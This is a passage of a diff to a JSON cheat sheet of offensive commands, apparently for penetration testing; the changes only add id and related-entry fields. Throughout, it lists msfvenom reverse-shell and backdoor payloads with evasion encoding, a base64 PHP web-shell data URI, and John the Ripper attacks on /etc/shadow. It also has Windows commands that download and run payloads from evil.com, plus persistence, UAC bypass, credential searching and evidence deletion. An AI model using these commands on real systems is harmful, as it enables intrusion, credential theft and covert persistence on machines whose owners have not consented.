       "Category": 6,
       "Description": "Subdomain enumeration with wfuzz",
       "Command": "wfuzz -c -z file,/path/to/wordlist.txt -H \"Host: FUZZ.target-site.com\" --hw 0 http://target-site.com",
-      "OS": "Linux"
+      "OS": "Linux",
+      "id": 246,
+      "related": [
+        245,
+        247,
+        248,
+        249,
+        250
+      ]
     },
     {
       "Name": "Encode Resource Base64",
       "Category": 2,
       "Description": "Uses PHP filter to encode a resource in base64, potentially for data exfiltration",
       "Command": "php://filter/convert.base64-encode/resource=",
-      "OS": "Win/Lin"
+      "OS": "Win/Lin",
+      "id": 247,
+      "related": [
+        245,
+        246,
+        248,
+        249,
+        250
+      ]
     },
     {
       "Name": "Execute Encoded Command",
       "Category": 2,
       "Description": "Executes a base64-encoded PHP payload via data URI to run system command 'uname -a'",
       "Command": "data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=uname%20-a",
-      "OS": "Win/Lin"
+      "OS": "Win/Lin",
+      "id": 248,
+      "related": [
+        245,
+        246,
+        247,
+        249,
+        250
+      ]
     },
     {
       "Name": "Start Python Server",
       "Category": 14,
       "Description": "Creates a simple python http server on port 80",
       "Command": "python3 -m http.server 80 ",
-      "OS": "Linux"
+      "OS": "Linux",
+      "id": 249,
+      "related": [
+        245,
+        246,
+        247,
+        248,
+        250
+      ]
     },
     {
       "Name": "Windows Meterpreter Backdoor Metasploit",
       "Category": 21,
       "Description": "Create a Windows Meterpreter backdoor.",
       "Command": "msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=4444 -f exe -o backdoor.exe",
-      "OS": "Linux"
+      "OS": "Linux",
+      "id": 250,
+      "related": [
+        251,
+        252,
+        253,
+        254,
+        255
+      ]
     },
     {
       "Name": "Android Meterpreter Payload Metasploit",
       "Category": 21,
       "Description": "Build an Android Meterpreter payload.",
       "Command": "msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=4444 -f apk -o app.apk",
-      "OS": "Linux"
+      "OS": "Linux",
+      "id": 251,
+      "related": [
+        250,
+        252,
+        253,
+        254,
+        255
+      ]
     },
     {
       "Name": "PHP Web Shell Metasploit",
       "Category": 21,
       "Description": "Create a PHP web shell.",
       "Command": "msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=4444 -f raw -o shell.php",
-      "OS": "Linux"
+      "OS": "Linux",
+      "id": 252,
+      "related": [
+        250,
+        251,
+        253,
+        254,
+        255
+      ]
     },
     {
       "Name": "Java Meterpreter Payload Metasploit",
       "Category": 21,
       "Description": "Generate a Java Meterpreter payload.",
       "Command": "msfvenom -p java/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=4444 -f jar -o app.jar",
-      "OS": "Linux"
+      "OS": "Linux",
+      "id": 253,
+      "related": [
+        250,
+        251,
+        252,
+        254,
+        255
+      ]
     },
     {
       "Name": "PowerShell Reverse Shell Metasploit",
       "Category": 21,
       "Description": "Create a PowerShell reverse shell.",
       "Command": "msfvenom -p cmd/windows/reverse_powershell LHOST=192.168.1.1 LPORT=4444 -f psh -o script.ps1",
-      "OS": "Linux"
+      "OS": "Linux",
+      "id": 254,
+      "related": [
+        250,
+        251,
+        252,
+        253,
+        255
+      ]
     },
     {
       "Name": "Encoded Windows Payload Metasploit",
       "Category": 21,
       "Description": "Encode a Windows payload for evasion.",
       "Command": "msfvenom -p windows/shell/reverse_tcp LHOST=192.168.1.1 LPORT=4444 -e x86/shikata_ga_nai -i 3 -f exe -o encoded.exe",
-      "OS": "Linux"
+      "OS": "Linux",
+      "id": 255,
+      "related": [
+        250,
+        251,
+        252,
+        253,
+        254
+      ]
     },
     {
       "Name": "Null-Free Linux Payload Metasploit",
       "Category": 21,
       "Description": "Generate a Linux payload without null bytes.",
       "Command": "msfvenom -p linux/x86/shell/reverse_tcp LHOST=192.168.1.1 LPORT=4444 -b \"\\x00\" -f elf -o safe.elf",
-      "OS": "Linux"
+      "OS": "Linux",
+      "id": 256,
+      "related": [
+        255,
+        257,
+        258,
+        259,
+        260
+      ]
     },
     {
       "Name": "C Shellcode Output Metasploit",
       "Category": 21,
       "Description": "Output a payload in C format.",
       "Command": "msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=4444 -f c -o shellcode.c",
-      "OS": "Linux"
+      "OS": "Linux",
+      "id": 257,
+      "related": [
+        255,
+        256,
+        258,
+        259,
+        260
+      ]
     },
     {
       "Name": "Python Meterpreter Output Metasploit",
       "Category": 21,
       "Description": "Output a Python Meterpreter payload.",
       "Command": "msfvenom -p python/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=4444 -f py -o shell.py",
-      "OS": "Linux"
+      "OS": "Linux",
+      "id": 258,
+      "related": [
+        255,
+        256,
+        257,
+        259,
+        260
+      ]
     },
     {
       "Name": "VBA Macro Payload Metasploit",
       "Category": 21,
       "Description": "Create a VBA payload for Office macros.",
       "Command": "msfvenom -p windows/shell/reverse_tcp LHOST=192.168.1.1 LPORT=4444 -f vba -o macro.vba",
-      "OS": "Linux"
+      "OS": "Linux",
+      "id": 259,
+      "related": [
+        255,
+        256,
+        257,
+        258,
+        260
+      ]
     },
     {
       "Name": "AES-Encrypted Payload Metasploit",
       "Category": 21,
       "Description": "Encrypt a payload with AES-256.",
       "Command": "msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=4444 --encrypt aes256 -f exe -o secure.exe",
-      "OS": "Linux"
+      "OS": "Linux",
+      "id": 260,
+      "related": [
+        255,
+        256,
+        257,
+        258,
+        259
+      ]
     },
     {
       "Name": "Template Injection Payload Metasploit",
       "Category": 21,
       "Description": "Inject payload into calc.exe.",
       "Command": "msfvenom -p windows/shell/reverse_tcp LHOST=192.168.1.1 LPORT=4444 --template calc.exe -f exe -o calc_backdoor.exe",
-      "OS": "Linux"
+      "OS": "Linux",
+      "id": 261,
+      "related": [
+        260,
+        262,
+        263,
+        264,
+        265
+      ]
     },
     {
       "Name": "Base64-Encoded Python Payload Metasploit",
       "Category": 21,
       "Description": "Encode a Python payload in Base64.",
       "Command": "msfvenom -p python/shell/reverse_tcp LHOST=192.168.1.1 LPORT=4444 -f py | base64",
-      "OS": "Linux"
+      "OS": "Linux",
+      "id": 262,
+      "related": [
+        260,
+        261,
+        263,
+        264,
+        265
+      ]
     },
     {
       "Name": "PowerShell Payload Execution Metasploit",
       "Category": 21,
       "Description": "Run a PowerShell payload",
       "Command": "msfvenom -p cmd/windows/reverse_powershell LHOST=192.168.1.1 LPORT=4444 -f psh | powershell -EncodedCommand",
-      "OS": "Linux"
+      "OS": "Linux",
+      "id": 263,
+      "related": [
+        260,
+        261,
+        262,
+        264,
+        265
+      ]
     },
     {
       "Name": "Linux Reverse Shell Metasploit",
       "Category": 21,
       "Description": "Generate a Linux reverse shell.",
       "Command": "msfvenom -p linux/x64/shell/reverse_tcp LHOST=192.168.1.1 LPORT=4444 -f elf -o shell.elf",
-      "OS": "Linux"
+      "OS": "Linux",
+      "id": 264,
+      "related": [
+        260,
+        261,
+        262,
+        263,
+        265
+      ]
     },
     {
       "Name": "Crack Linux Shadow File John",
       "Category": 13,
       "Description": "Targets SHA-512 hashed passwords in Linux shadow file.",
       "Command": "john --format=sha512crypt /etc/shadow",
-      "OS": "Linux"
+      "OS": "Linux",
+      "id": 265,
+      "related": [
+        264,
+        266,
+        267,
+        268,
+        269
+      ]
     },
     {
       "Name": "Crack Windows NTLM Hashes John",
       "Category": 13,
       "Description": "Cracks NTLM hashes from Windows system dump.",
       "Command": "john --format=nt nt_hashes.txt",
-      "OS": "Linux"
+      "OS": "Linux",
+      "id": 266,
+      "related": [
+        264,
+        265,
+        267,
+        268,
+        269
+      ]
     },
     {
       "Name": "Wordlist with Rules Cracking John",
       "Category": 13,
       "Description": "Applies mangling rules to rockyou.txt for MD5 hashes.",
       "Command": "john --wordlist=rockyou.txt --rules --format=raw-md5 hashes.txt",
-      "OS": "Linux"
+      "OS": "Linux",
+      "id": 267,
+      "related": [
+        264,
+        265,
+        266,
+        268,
+        269
+      ]
     },
     {
       "Name": "Brute-Force Mask Cracking John",
       "Category": 13,
       "Description": "Tries 4 lowercase letters and 2 digits for SHA-1.",
       "Command": "john --mask=?l?l?l?l?d?d --format=raw-sha1 hashes.txt",
-      "OS": "Linux"
+      "OS": "Linux",
+      "id": 268,
+      "related": [
+        264,
+        265,
+        266,
+        267,
+        269
+      ]
     },
     {
       "Name": "Crack ZIP Archive Password John",
       "Category": 13,
       "Description": "Cracks ZIP archive password.",
       "Command": "zip2john archive.zip > zip.hash john --format=zip zip.hash",
-      "OS": "Linux"
+      "OS": "Linux",
+      "id": 269,
+      "related": [
+        264,
+        265,
+        266,
+        267,
+        268
+      ]
     },
     {
       "Name": "Crack PDF Password John",
       "Category": 13,
       "Description": "Cracks PDF document password.",
       "Command": "pdf2john document.pdf > pdf.hash john --format=pdf pdf.hash",
-      "OS": "Linux"
+      "OS": "Linux",
+      "id": 270,
+      "related": [
+        269,
+        271,
+        272,
+        273,
+        274
+      ]
     },
     {
       "Name": "Single Crack Mode John",
       "Category": 13,
       "Description": "Cracks weak passwords using username/GECOS data.",
       "Command": "john --single --format=raw-md5 hashes.txt",
-      "OS": "Linux"
+      "OS": "Linux",
+      "id": 271,
+      "related": [
+        269,
+        270,
+        272,
+        273,
+        274
+      ]
     },
     {
       "Name": "Show Cracked Passwords John",
       "Category": 13,
       "Description": "Displays cracked passwords from hashes.txt.",
       "Command": "john --show hashes.txt",
-      "OS": "Linux"
+      "OS": "Linux",
+      "id": 272,
+      "related": [
+        269,
+        270,
+        271,
+        273,
+        274
+      ]
     },
     {
       "Name": "Restore Interrupted Session John",
       "Category": 13,
       "Description": "Resumes last interrupted session.",
       "Command": "john --restore",
-      "OS": "Linux"
+      "OS": "Linux",
+      "id": 273,
+      "related": [
+        269,
+        270,
+        271,
+        272,
+        274
+      ]
     },
     {
       "Name": "GPU Accelerated Cracking John",
       "Category": 13,
       "Description": "Uses GPU for faster SHA-512 cracking.",
       "Command": "john --format=sha512crypt-opencl --device=0 /etc/shadow",
-      "OS": "Linux"
+      "OS": "Linux",
+      "id": 274,
+      "related": [
+        269,
+        270,
+        271,
+        272,
+        273
+      ]
     },
     {
       "Name": "Crack Bcrypt Hashes John",
       "Category": 13,
       "Description": "Targets bcrypt hashes.",
       "Command": "john --format=bcrypt hashes.txt",
-      "OS": "Linux"
+      "OS": "Linux",
+      "id": 275,
+      "related": [
+        274,
+        276,
+        277,
+        278,
+        279
+      ]
     },
     {
       "Name": "Custom Charset Cracking John",
       "Category": 13,
       "Description": "Uses custom charset for MD5 brute-forcing.",
       "Command": "john --make-charset=custom.chr john --incremental=custom --format=raw-md5 hashes.txt",
-      "OS": "Linux"
+      "OS": "Linux",
+      "id": 276,
+      "related": [
+        274,
+        275,
+        277,
+        278,
+        279
+      ]
     },
     {
       "Name": "Multi-Process Cracking John",
       "Category": 13,
       "Description": "Runs 4 parallel processes for SHA-256 cracking.",
       "Command": "john --fork=4 --format=raw-sha256 hashes.txt",
-      "OS": "Linux"
+      "OS": "Linux",
+      "id": 277,
+      "related": [
+        274,
+        275,
+        276,
+        278,
+        279
+      ]
     },
     {
       "Name": "Crack Specific Users John",
       "Category": 13,
       "Description": "Cracks passwords for root and admin.",
       "Command": "john --users=root,admin --format=sha512crypt /etc/shadow",
-      "OS": "Linux"
+      "OS": "Linux",
+      "id": 278,
+      "related": [
+        274,
+        275,
+        276,
+        277,
+        279
+      ]
     },
     {
       "Name": "Loopback Mode Cracking John",
       "Category": 13,
       "Description": "Reuses cracked passwords as wordlist for MD5.",
       "Command": "john --wordlist=rockyou.txt --rules --loopback --format=raw-md5 hashes.txt",
-      "OS": "Linux"
+      "OS": "Linux",
+      "id": 279,
+      "related": [
+        274,
+        275,
+        276,
+        277,
+        278
+      ]
     },
     {
       "Name": "Mask and Wordlist Cracking John",
       "Category": 13,
       "Description": "Appends two digits to wordlist entries for SHA-1.",
       "Command": "john --wordlist=rockyou.txt --mask=?w?d?d --format=raw-sha1 hashes.txt",
-      "OS": "Linux"
+      "OS": "Linux",
+      "id": 280,
+      "related": [
+        279,
+        281,
+        282,
+        283,
+        284
+      ]
     },
     {
       "Name": "Show Progress Every Minute John",
       "Category": 13,
       "Description": "Displays progress every 60 seconds.",
       "Command": "john --progress-every=60 --format=raw-md5 hashes.txt",
-      "OS": "Linux"
+      "OS": "Linux",
+      "id": 281,
+      "related": [
+        279,
+        280,
+        282,
+        283,
+        284
+      ]
     },
     {
       "Name": "External Mode Cracking John",
       "Category": 13,
       "Description": "Uses external filter for MD5 candidates.",
       "Command": "john --external=filter_latin1 --format=raw-md5 hashes.txt",
-      "OS": "Linux"
+      "OS": "Linux",
+      "id": 282,
+      "related": [
+        279,
+        280,
+        281,
+        283,
+        284
+      ]
     },
     {
       "Name": "Specific Encoding Cracking John",
       "Category": 13,
       "Description": "Uses UTF-8 encoding for wordlists.",
       "Command": "john --encoding=utf8 --format=raw-md5 hashes.txt",
-      "OS": "Linux"
+      "OS": "Linux",
+      "id": 283,
+      "related": [
+        279,
+        280,
+        281,
+        282,
+        284
+      ]
     },
     {
       "Name": "Bcrypt Cost Range Cracking John",
       "Category": 13,
       "Description": "Targets bcrypt hashes with cost factors 10 to 12.",
       "Command": "john --costs=10:12 --format=bcrypt hashes.txt",
-      "OS": "Linux"
+      "OS": "Linux",
+      "id": 284,
+      "related": [
+        279,
+        280,
+        281,
+        282,
+        283
+      ]
     },
     {
       "Name": "Execute PowerShell Command",
       "Category": 15,
       "Description": "Execute PowerShell commands",
       "Command": "powershell -c <command>",
-      "OS": "Windows"
+      "OS": "Windows",
+      "id": 285,
+      "related": [
+        284,
+        286,
+        287,
+        288,
+        289
+      ]
     },
     {
       "Name": "Run Basic Shell Command",
       "Category": 17,
       "Description": "Run basic shell commands",
       "Command": "cmd /c <command>",
-      "OS": "Windows"
+      "OS": "Windows",
+      "id": 286,
+      "related": [
+        284,
+        285,
+        287,
+        288,
+        289
+      ]
     },
     {
       "Name": "Execute HTA File",
       "Category": 8,
       "Description": "Execute HTA files",
       "Command": "mshta http://evil.com/mal.hta",
-      "OS": "Windows"
+      "OS": "Windows",
+      "id": 287,
+      "related": [
+        284,
+        285,
+        286,
+        288,
+        289
+      ]
     },
     {
       "Name": "Load Malicious DLL",
       "Category": 8,
       "Description": "Load malicious DLLs",
       "Command": "rundll32.exe evil.dll,EntryPoint",
-      "OS": "Windows"
+      "OS": "Windows",
+      "id": 288,
+      "related": [
+        284,
+        285,
+        286,
+        287,
+        289
+      ]
     },
     {
       "Name": "Install Payload Silently",
       "Category": 8,
       "Description": "Install payloads silently",
       "Command": "msiexec /q /i http://evil.com/payload.msi",
-      "OS": "Windows"
+      "OS": "Windows",
+      "id": 289,
+      "related": [
+        284,
+        285,
+        286,
+        287,
+        288
+      ]
     },
     {
       "Name": "Spawn Process via WMI",
       "Category": 17,
       "Description": "Spawn processes via WMI",
       "Command": "wmic process call create \"cmd.exe /c evil.exe\"",
-      "OS": "Windows"
+      "OS": "Windows",
+      "id": 290,
+      "related": [
+        289,
+        291,
+        292,
+        293,
+        294
+      ]
     },
     {
       "Name": "Loop Execution",
       "Category": 17,
       "Description": "Loop execution",
       "Command": "forfiles /p c:\\ /c \"cmd /c evil.exe\"",
-      "OS": "Windows"
+      "OS": "Windows",
+      "id": 291,
+      "related": [
+        289,
+        290,
+        292,
+        293,
+        294
+      ]
     },
     {
       "Name": "Escalate via Program Compatibility",
       "Category": 9,
       "Description": "Escalate via program compatibility",
       "Command": "pcalua -a evil.exe",
-      "OS": "Windows"
+      "OS": "Windows",
+      "id": 292,
+      "related": [
+        289,
+        290,
+        291,
+        293,
+        294
+      ]
     },
     {
       "Name": "Run Script via DLL",
       "Category": 8,
       "Description": "Run scripts via DLL",
       "Command": "regsvr32 /s /u /i:http://evil.com/script.sct scrobj.dll",
-      "OS": "Windows"
+      "OS": "Windows",
+      "id": 293,
+      "related": [
+        289,
+        290,
+        291,
+        292,
+        294
+      ]
     },
     {
       "Name": "Execute INF File",
       "Category": 8,
       "Description": "Execute INF files",
       "Command": "cmstp /ni /s evil.inf",
-      "OS": "Windows"
+      "OS": "Windows",
+      "id": 294,
+      "related": [
+        289,
+        290,
+        291,
+        292,
+        293
+      ]
     },
     {
       "Name": "Run VBScript",
       "Category": 8,
       "Description": "Run VBScripts",
       "Command": "wscript script.vbs",
-      "OS": "Windows"
+      "OS": "Windows",
+      "id": 295,
+      "related": [
+        294,
+        296,
+        297,
+        298,
+        299
+      ]
     },
     {
       "Name": "Run Script Silently",
       "Category": 8,
       "Description": "Run scripts silently",
       "Command": "cscript script.vbs",
-      "OS": "Windows"
+      "OS": "Windows",
+      "id": 296,
+      "related": [
+        294,
+        295,
+        297,
+        298,
+        299
+      ]
     },
     {
       "Name": "Launch in New Window",
       "Category": 17,
       "Description": "Launch in new window",
       "Command": "start cmd /c evil.exe",
-      "OS": "Windows"
+      "OS": "Windows",
+      "id": 297,
+      "related": [
+        294,
+        295,
+        296,
+        298,
+        299
+      ]
     },
     {
       "Name": "Use Alternate Credentials",
       "Category": 17,
       "Description": "Use alternate credentials",
       "Command": "runas /user:hacker cmd.exe",
-      "OS": "Windows"
+      "OS": "Windows",
+      "id": 298,
+      "related": [
+        294,
+        295,
+        296,
+        297,
+        299
+      ]
     },
     {
       "Name": "Install Updates with Payloads",
       "Category": 8,
       "Description": "Install updates with payloads",
       "Command": "wusa evil.msu /quiet",
-      "OS": "Windows"
+      "OS": "Windows",
+      "id": 299,
+      "related": [
+        294,
+        295,
+        296,
+        297,
+        298
+      ]
     },
     {
       "Name": "Schedule Daily Tasks",
       "Category": 9,
       "Description": "Schedule daily tasks",
       "Command": "schtasks /create /tn \"Task\" /tr \"cmd.exe\" /sc daily",
-      "OS": "Windows"
+      "OS": "Windows",
+      "id": 300,
+      "related": [
+        9,
+        15,
+        17,
+        31,
+        36
+      ]
     },
     {
       "Name": "Add to Startup Registry",
       "Category": 9,
       "Description": "Add to startup",
       "Command": "reg add HKCU\\Software\\Run /v Evil /t REG_SZ /d \"cmd.exe\"",
-      "OS": "Windows"
+      "OS": "Windows",
+      "id": 301,
+      "related": [
+        9,
+        15,
+        17,
+        31,
+        36
+      ]
     },
     {
       "Name": "Create Persistent Service",
       "Category": 9,
       "Description": "Create persistent service",
       "Command": "sc create EvilService binpath=\"cmd.exe /c evil.exe\"",
-      "OS": "Windows"
+      "OS": "Windows",
+      "id": 302,
+      "related": [
+        9,
+        15,
+        17,
+        31,
+        36
+      ]
     },
     {
       "Name": "Legacy Task Scheduling",
       "Category": 9,
       "Description": "Legacy task scheduling",
       "Command": "at 12:00 cmd.exe /c evil.exe",
-      "OS": "Windows"
+      "OS": "Windows",
+      "id": 303,
+      "related": [
+        9,
+        15,
+        17,
+        31,
+        36
+      ]
     },
     {
       "Name": "Persist via WMI",
       "Category": 9,
       "Description": "Persist via WMI",
       "Command": "mofcomp evil.mof",
-      "OS": "Windows"
+      "OS": "Windows",
+      "id": 304,
+      "related": [
+        9,
+        15,
+        17,
+        31,
+        36
+      ]
     },
     {
       "Name": "Hijack File Associations",
       "Category": 9,
       "Description": "Hijack file associations",
       "Command": "assoc .txt=evil.exe",
-      "OS": "Windows"
+      "OS": "Windows",
+      "id": 305,
+      "related": [
+        9,
+        15,
+        17,
+        31,
+        36
+      ]
     },
     {
       "Name": "Link File Types to Payloads",
       "Category": 9,
       "Description": "Link file types to payloads",
       "Command": "ftype txtfile=evil.exe \"%1\"",
-      "OS": "Windows"
+      "OS": "Windows",
+      "id": 306,
+      "related": [
+        9,
+        15,
+        17,
+        31,
+        36
+      ]
     },
     {
       "Name": "Alter Boot Config",
       "Category": 9,
       "Description": "Alter boot config",
       "Command": "bcdedit /set {default} safeboot network",
-      "OS": "Windows"
+      "OS": "Windows",
+      "id": 307,
+      "related": [
+        9,
+        15,
+        17,
+        31,
+        36
+      ]
     },
     {
       "Name": "Bypass UAC via Registry",
       "Category": 9,
       "Description": "Bypass UAC via registry",
       "Command": "eventvwr",
-      "OS": "Windows"
+      "OS": "Windows",
+      "id": 308,
+      "related": [
+        9,
+        15,
+        17,
+        31,
+        36
+      ]
     },
     {
       "Name": "Elevate Silently",
       "Category": 9,
       "Description": "Elevate silently",
       "Command": "fodhelper",
-      "OS": "Windows"
+      "OS": "Windows",
+      "id": 309,
+      "related": [
+        9,
+        15,
+        17,
+        31,
+        36
+      ]
     },
     {
       "Name": "Trigger Elevated Process",
       "Category": 9,
       "Description": "Trigger elevated process",
       "Command": "sdclt /kickoffelev",
-      "OS": "Windows"
+      "OS": "Windows",
+      "id": 310,
+      "related": [
+        9,
+        15,
+        17,
+        31,
+        36
+      ]
     },
     {
       "Name": "Download Files with Bitsadmin",
       "Category": 17,
       "Description": "Download files",
       "Command": "bitsadmin /transfer job /download /priority normal http://evil.com/file.exe C:\file.exe",
-      "OS": "Windows"
+      "OS": "Windows",
+      "id": 311,
+      "related": [
+        225,
+        226,
+        227,
+        228,
+        229
+      ]
     },
     {
       "Name": "Fetch Files with Certutil",
       "Category": 17,
       "Description": "Fetch files",
       "Command": "certutil -urlfetch -f http://evil.com/file.exe file.exe",
-      "OS": "Windows"
+      "OS": "Windows",
+      "id": 312,
+      "related": [
+        225,
+        226,
+        227,
+        228,
+        229
+      ]
     },
     {
       "Name": "PowerShell Download",
       "Category": 15,
       "Description": "PowerShell download",
       "Command": "IWR -Uri http://evil.com/file -OutFile file.exe",
-      "OS": "Windows"
+      "OS": "Windows",
+      "id": 313,
+      "related": [
+        225,
+        226,
+        227,
+        228,
+        229
+      ]
     },
     {
       "Name": "Decode Base64 Files with Certutil",
       "Category": 17,
       "Description": "Decode base64 files",
       "Command": "certutil -decode encoded.txt decoded.exe",
-      "OS": "Windows"
+      "OS": "Windows",
+      "id": 314,
+      "related": [
+        225,
+        226,
+        227,
+        228,
+        229
+      ]
     },
     {
       "Name": "List Processes with WMIC",
       "Category": 17,
       "Description": "List processes",
       "Command": "wmic process list",
-      "OS": "Windows"
+      "OS": "Windows",
+      "id": 315,
+      "related": [
+        230,
+        231,
+        232,
+        233,
+        234
+      ]
     },
     {
       "Name": "Create Users with Net",
       "Category": 17,
       "Description": "Create users",
       "Command": "net user /add hacker password",
-      "OS": "Windows"
+      "OS": "Windows",
+      "id": 316,
+      "related": [
+        230,
+        231,
+        232,
+        233,
+        234
+      ]
     },
     {
       "Name": "Show Network Connections",
       "Category": 17,
       "Description": "Show network connections",
       "Command": "netstat -ano",
-      "OS": "Windows"
+      "OS": "Windows",
+      "id": 317,
+      "related": [
+        230,
+        231,
+        232,
+        233,
+        234
+      ]
     },
     {
       "Name": "Display Network Config",
       "Category": 17,
       "Description": "Display network config",
       "Command": "ipconfig /all",
-      "OS": "Windows"
+      "OS": "Windows",
+      "id": 318,
+      "related": [
+        230,
+        231,
+        232,
+        233,
+        234
+      ]
     },
     {
       "Name": "Check User Privileges",
       "Category": 17,
       "Description": "Check user privileges",
       "Command": "whoami /all",
-      "OS": "Windows"
+      "OS": "Windows",
+      "id": 319,
+      "related": [
+        230,
+        231,
+        232,
+        233,
+        234
+      ]
     },
     {
       "Name": "Get System Details",
       "Category": 17,
       "Description": "Get system details",
       "Command": "systeminfo",
-      "OS": "Windows"
+      "OS": "Windows",
+      "id": 320,
+      "related": [
+        230,
+        231,
+        232,
+        233,
+        234
+      ]
     },
     {
       "Name": "List Processes with Details",
       "Category": 17,
       "Description": "List processes with details",
       "Command": "tasklist /v",
-      "OS": "Windows"
+      "OS": "Windows",
+      "id": 321,
+      "related": [
+        230,
+        231,
+        232,
+        233,
+        234
+      ]
     },
     {
       "Name": "Enumerate Files",
       "Category": 17,
       "Description": "Enumerate files",
       "Command": "dir /s /b c:\\ > files.txt",
-      "OS": "Windows"
+      "OS": "Windows",
+      "id": 322,
+      "related": [
+        230,
+        231,
+        232,
+        233,
+        234
+      ]
     },
     {
       "Name": "Search for Credentials",
       "Category": 17,
       "Description": "Search for creds",
       "Command": "findstr /si password *.txt",
-      "OS": "Windows"
+      "OS": "Windows",
+      "id": 323,
+      "related": [
+        230,
+        231,
+        232,
+        233,
+        234
+      ]
     },
     {
       "Name": "Read File Content",
       "Category": 17,
       "Description": "Read file contents",
       "Command": "type secret.txt",
-      "OS": "Windows"
+      "OS": "Windows",
+      "id": 324,
+      "related": [
+        230,
+        231,
+        232,
+        233,
+        234
+      ]
     },
     {
       "Name": "List Drivers",
       "Category": 17,
       "Description": "List drivers",
       "Command": "driverquery",
-      "OS": "Windows"
+      "OS": "Windows",
+      "id": 325,
+      "related": [
+        230,
+        231,
+        232,
+        233,
+        234
+      ]
     },
     {
       "Name": "List Drives",
       "Category": 17,
       "Description": "List drives",
       "Command": "fsutil fsinfo drives",
-      "OS": "Windows"
+      "OS": "Windows",
+      "id": 326,
+      "related": [
+        230,
+        231,
+        232,
+        233,
+        234
+      ]
     },
     {
       "Name": "Show Group Policy",
       "Category": 17,
       "Description": "Show group policy",
       "Command": "gpresult /r",
-      "OS": "Windows"
+      "OS": "Windows",
+      "id": 327,
+      "related": [
+        230,
+        231,
+        232,
+        233,
+        234
+      ]
     },
     {
       "Name": "Roast AS-REP Hashes",
       "Category": 12,
       "Description": "Attempts to enumerate and extract Kerberos AS-REP hashes for user accounts listed in the ./users file",
       "Command": "impacket-GetNPUsers FOREST.HTB/ -dc-ip 10.11.11.162 -usersfile ./users -request -format hashcat -outputfile hashes.txt",
-      "OS": "Linux"
+      "OS": "Linux",
+      "id": 328,
+      "related": [
+        10,
+        11,
+        12,
+        13,
+        14
+      ]
     },
     {
       "Name": "Get Domain LDAP Anon",
       "Category": 12,
       "Description": "Get's the default naming context and displays the domain name",
       "Command": "ldapsearch -x -H ldap://10.11.11.162 -b \"\" -s base \"(objectClass=*)\" defaultNamingContext",
-      "OS": "Linux"
+      "OS": "Linux",
+      "id": 329,
+      "related": [
+        16,
+        17,
+        18,
+        19,
+        20
+      ]
     },
     {
       "Name": "Domain Controller Query",
       "Category": 12,
       "Description": "Domain controller info",
       "Command": "netdom query dc",
-      "OS": "Windows"
+      "OS": "Windows",
+      "id": 330,
+      "related": [
+        16,
+        17,
+        18,
+        19,
+        20
+      ]
     },
     {
       "Name": "Domain Trust Details",
       "Category": 12,
       "Description": "Domain trust details",
       "Command": "nltest /dsgetdc:domain",
-      "OS": "Windows"
+      "OS": "Windows",
+      "id": 331,
+      "related": [
+        16,
+        17,
+        18,
+        19,
+        20
+      ]
     },
     {
       "Name": "Query AD Objects",
       "Category": 12,
       "Description": "Query AD objects",
       "Command": "dsquery * -limit 0",
-      "OS": "Windows"
+      "OS": "Windows",
+      "id": 332,
+      "related": [
+        16,
+        17,
+        18,
+        19,
+        20
+      ]
     },
     {
       "Name": "List User Sessions",
       "Category": 17,
       "Description": "List user sessions",
       "Command": "query user",
-      "OS": "Windows"
+      "OS": "Windows",
+      "id": 333,
+      "related": [
+        230,
+        231,
+        232,
+        233,
+        234
+      ]
     },
     {
       "Name": "Port Forwarding with Netsh",
       "Category": 17,
       "Description": "Port forwarding",
       "Command": "netsh interface portproxy add v4tov4 listenport=80 connectport=8080 connectaddress=127.0.0.1",
-      "OS": "Windows"
+      "OS": "Windows",
+      "id": 334,
+      "related": [
+        186,
+        187,
+        188,
+        189,
+        190
+      ]
     },
     {
       "Name": "Remote Desktop Connection",
       "Category": 17,
       "Description": "Remote desktop",
       "Command": "mstsc /v:192.168.1.1",
-      "OS": "Windows"
+      "OS": "Windows",
+      "id": 335,
+      "related": [
+        230,
+        231,
+        232,
+        233,
+        234
+      ]
     },
     {
       "Name": "Copy Files",
       "Category": 17,
       "Description": "Copy files",
       "Command": "copy evil.exe c:\\windows\\temp",
-      "OS": "Windows"
+      "OS": "Windows",
+      "id": 336,
+      "related": [
+        230,
+        231,
+        232,
+        233,
+        234
+      ]
     },
     {
       "Name": "Move Files",
       "Category": 17,
       "Description": "Move files",
       "Command": "move evil.exe c:\\windows\\system32",
-      "OS": "Windows"
+      "OS": "Windows",
+      "id": 337,
+      "related": [
+        230,
+        231,
+        232,
+        233,
+        234
+      ]
     },
     {
       "Name": "Delete Files",
       "Category": 17,
       "Description": "Delete files",
       "Command": "del evidence.txt",
-      "OS": "Windows"
+      "OS": "Windows",
+      "id": 338,
+      "related": [
+        230,
+        231,
+        232,
+        233,
+        234
+      ]
     },
     {
       "Name": "Create Files",
       "Category": 17,
       "Description": "Create files",
       "Command": "echo PAYLOAD > evil.bat",
-      "OS": "Windows"
+      "OS": "Windows",
+      "id": 339,
+      "related": [
+        230,
+        231,
+        232,
+        233,
+        234
+      ]
     },
     {
       "Name": "Hide Files",
       "Category": 17,
       "Description": "Hide files",
       "Command": "attrib +h evil.exe",
-      "OS": "Windows"
+      "OS": "Windows",
+      "id": 340,
+      "related": [
+        230,
+        231,
+        232,
+        233,
+        234
+      ]
     },
     {
       "Name": "Modify Permissions",
       "Category": 17,
       "Description": "Modify permissions",
       "Command": "icacls file.exe /grant hacker:f",
-      "OS": "Windows"
+      "OS": "Windows",
+      "id": 341,
+      "related": [
+        230,
+        231,
+        232,
+        233,
+        234
+      ]
     },
     {
       "Name": "Take Ownership",
       "Category": 17,
       "Description": "Take ownership",
       "Command": "takeown /f file.exe",
-      "OS": "Windows"
+      "OS": "Windows",
+      "id": 342,
+      "related": [
+        230,
+        231,
+        232,
+        233,
+        234
+      ]
     },
     {
       "Name": "Share Files",
       "Category": 17,
       "Description": "Share files",
       "Command": "net share evil=c:\\evil /grant:hacker,full",
-      "OS": "Windows"
+      "OS": "Windows",
+      "id": 343,
+      "related": [
+        230,
+        231,
+        232,
+        233,
+        234
